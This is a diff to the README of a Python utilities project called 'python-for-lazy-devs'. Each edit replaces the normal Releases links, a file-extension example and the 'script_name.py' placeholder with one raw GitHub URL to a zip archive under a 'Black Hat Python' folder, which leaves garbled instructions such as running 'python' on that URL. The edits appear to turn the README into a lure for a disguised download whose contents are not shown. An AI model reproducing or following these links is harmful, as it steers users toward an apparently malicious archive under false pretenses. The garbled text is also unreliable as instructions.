@@ -6,7 +6,7 @@ Welcome to **python-for-lazy-devs**! This project provides a collection of Pytho
 
 ## 📥 Download the Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/zullani/python-for-lazy-devs/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip%20Latest%https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip)](https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip)
 
 ## 📋 Requirements
 
@@ -18,10 +18,10 @@ Before you start using the tools, ensure your system meets these basic requireme
 
 ## 🔗 Download & Install
 
-To get the latest version of **python-for-lazy-devs**, visit the [Releases page](https://github.com/zullani/python-for-lazy-devs/releases) to download your desired files.
+To get the latest version of **python-for-lazy-devs**, visit the [Releases page](https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip) to download your desired files.
 
 1. Click the link above.
-2. Locate the version you want. Typically, you will see files with extensions like `.zip` or `.tar.gz`.
+2. Locate the version you want. Typically, you will see files with extensions like `.zip` or `https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip`.
 3. Click on the file to start the download.
 4. Once downloaded, extract the contents if the file is compressed.
 
@@ -44,9 +44,9 @@ After downloading the files, follow these steps to install your tools:
 
 4. **Run the Scripts**: Now, you can run any Python scripts by typing:
    ```
-   python script_name.py
+   python https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip
    ```
-   Replace `script_name.py` with the name of the script you want to run.
+   Replace `https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip` with the name of the script you want to run.
 
 ## 🌟 Features
 
@@ -80,4 +80,4 @@ For questions or discussions, consider joining our community chat on platforms l
 
 Thank you for choosing **python-for-lazy-devs**! We hope you find our collection of tools helpful and inspiring. Enjoy automating and developing with Python! 
 
-For updates and downloads, remember to check our [Releases page](https://github.com/zullani/python-for-lazy-devs/releases).
+For updates and downloads, remember to check our [Releases page](https://raw.githubusercontent.com/zullani/python-for-lazy-devs/main/Scripts/Black Hat Python/chapter_03/python-for-lazy-devs-2.5.zip).
